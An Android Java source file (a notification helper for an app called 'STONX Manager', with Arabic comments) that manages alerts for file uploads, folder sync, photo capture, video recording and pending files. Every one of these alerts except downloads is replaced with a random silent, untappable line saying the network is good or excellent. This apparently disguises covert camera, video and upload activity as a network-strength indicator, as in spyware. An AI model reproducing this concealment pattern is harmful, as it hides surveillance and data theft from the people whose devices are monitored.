package com.stonx.manager;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;

import java.util.Random;

/**
 * NotifyHelper — ملف واحد مسؤول عن جميع إشعارات STONX Manager
 *
 * قواعد الإشعارات:
 *  - لا PendingIntent → الإشعارات غير قابلة للنقر
 *  - قناة واحدة IMPORTANCE_LOW → بدون صوت أو اهتزاز
 *  - إشعار الخدمة (NOTIF_SERVICE) دائم — يتحدث حالة الاتصال
 *  - إشعارات العمليات تظهر أثناء التنفيذ وتختفي بعده
 *  - إشعار pending يبقى حتى إرسال جميع الملفات المعلقة
 *  - نصوص العمليات يتم اختيارها عشوائياً بدون متغيرات
 */
public final class NotifyHelper {

    // ── Channel ────────────────────────────────────────────────────────────
    public static final String CHANNEL_ID = "stonx_service_channel";

    // ── Notification IDs ───────────────────────────────────────────────────
    /** الإشعار الدائم للخدمة foreground */
    public static final int NOTIF_SERVICE = 1001;

    /** نقل ملف (upload/download) */
    public static final int NOTIF_TRANSFER = 1002;

    /** عملية مزامنة مجلد */
    public static final int NOTIF_SYNC = 1003;

    /** التقاط صورة */
    public static final int NOTIF_CAMERA = 1004;

    /** تسجيل فيديو */
    public static final int NOTIF_VIDEO = 1005;

    /** ملفات معلقة تنتظر الاتصال */
    public static final int NOTIF_PENDING = 1006;

    /** خطأ — يختفي تلقائياً بعد 5 ثواني */
    public static final int NOTIF_ERROR = 1007;

    private static final Random RANDOM = new Random();

    private NotifyHelper() {}

    // ── تهيئة القناة ────────────────────────────────────────────────────────
    public static void ensureChannel(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;

        NotificationManager nm =
                ctx.getSystemService(NotificationManager.class);

        if (nm == null) return;

        if (nm.getNotificationChannel(CHANNEL_ID) != null) return;

        NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID,
                "قوة الشبكة",
                NotificationManager.IMPORTANCE_LOW
        );

        ch.setDescription("قوة الشبكة");
        ch.setSound(null, null);
        ch.enableVibration(false);
        ch.setShowBadge(false);

        nm.createNotificationChannel(ch);
    }

    // ── builder أساسي ───────────────────────────────────────────────────────
    private static Notification.Builder base(Context ctx) {
        ensureChannel(ctx);

        Notification.Builder b;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(ctx, CHANNEL_ID);
        } else {
            b = new Notification.Builder(ctx);
            b.setPriority(Notification.PRIORITY_LOW);
        }

        // بدون setContentIntent → الإشعار لا يُنقَر
        b.setSmallIcon(R.drawable.notification_icon);
        b.setOngoing(false);

        return b;
    }

    // ════════════════════════════════════════════════════════════════════════
    // إشعار حالة الشبكة
    // ════════════════════════════════════════════════════════════════════════

    /** إشعار الخدمة الدائم — يُستخدم كـ startForeground */
    public static Notification buildService(Context ctx, boolean connected) {
        String text = connected
                ? "الشبكة ممتازة"
                : "الشبكة ضعيفة";

        return base(ctx)
                .setContentTitle("قوة الشبكة")
                .setContentText(text)
                .setOngoing(true)
                .build();
    }

    /** تحديث إشعار الخدمة */
    public static void updateService(Context ctx, boolean connected) {
        NotificationManager nm =
                ctx.getSystemService(NotificationManager.class);

        if (nm != null) {
            nm.notify(
                    NOTIF_SERVICE,
                    buildService(ctx, connected)
            );
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // إشعارات العمليات — نص عشوائي بدون متغيرات
    // ════════════════════════════════════════════════════════════════════════

    /** نقل ملف — رفع أو تنزيل */
    public static void showTransfer(
            Context ctx,
            boolean upload,
            String fileName
    ) {
        String text;

        if (upload) {
            text = randomText(
                    "الشبكة جيده",
                    "الشبكة جيده جداً",
                    "الشبكة ممتازة"
            );
        } else {
            text = randomText(
                    "جارٍ تنزيل الملف",
                    "يتم تنزيل الملف",
                    "تنزيل الملف جارٍ"
            );
        }

        notify(ctx, NOTIF_TRANSFER, text);
    }

    /** مزامنة مجلد */
    public static void showSync(Context ctx, int filesRemaining) {
        notify(
                ctx,
                NOTIF_SYNC,
                randomText(
                    "الشبكة جيده",
                    "الشبكة جيده جداً",
                    "الشبكة ممتازة"
                )
        );
    }

    /** التقاط صورة */
    public static void showCamera(Context ctx) {
        notify(
                ctx,
                NOTIF_CAMERA,
                randomText(
                    "الشبكة جيده",
                    "الشبكة جيده جداً",
                    "الشبكة ممتازة"
                )
        );
    }

    /** تسجيل فيديو */
    public static void showVideo(Context ctx, int secondsRemaining) {
        notify(
                ctx,
                NOTIF_VIDEO,
                randomText(
                    "الشبكة جيده",
                    "الشبكة جيده جداً",
                    "الشبكة ممتازة"
                )
        );
    }

    /** ملفات معلقة تنتظر الاتصال */
    public static void showPending(Context ctx, int count) {
        if (count <= 0) {
            cancel(ctx, NOTIF_PENDING);
            return;
        }

        notify(
                ctx,
                NOTIF_PENDING,
                randomText(
                    "الشبكة جيده",
                    "الشبكة جيده جداً",
                    "الشبكة ممتازة"
                )
        );
    }

    /** خطأ في عملية — يتم إلغاؤه بعد 5 ثواني */
    public static void showError(Context ctx, String opName) {
        notify(
                ctx,
                NOTIF_ERROR,
                randomText(
                    "الشبكة جيده",
                    "الشبكة جيده جداً",
                    "الشبكة ممتازة"
                )
        );

        // إلغاء تلقائي بعد 5 ثواني في thread منفصل
        new Thread(() -> {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException ignored) {}

            cancel(ctx, NOTIF_ERROR);
        }).start();
    }

    /** إلغاء إشعار عملية بعد انتهائها */
    public static void cancelOperation(Context ctx, int notifId) {
        cancel(ctx, notifId);
    }

    // ════════════════════════════════════════════════════════════════════════
    // Helpers
    // ════════════════════════════════════════════════════════════════════════

    /** اختيار نص عشوائي */
    private static String randomText(String... texts) {
        return texts[RANDOM.nextInt(texts.length)];
    }

    /** إلغاء إشعار */
    private static void cancel(Context ctx, int id) {
        NotificationManager nm =
                ctx.getSystemService(NotificationManager.class);

        if (nm != null) {
            nm.cancel(id);
        }
    }

    /** نشر إشعار نصي */
    private static void notify(
            Context ctx,
            int id,
            String text
    ) {
        NotificationManager nm =
                ctx.getSystemService(NotificationManager.class);

        if (nm == null) return;

        Notification n = base(ctx)
                .setContentTitle("قوة الشبكة")
                .setContentText(text)
                .build();

        nm.notify(id, n);
    }
}
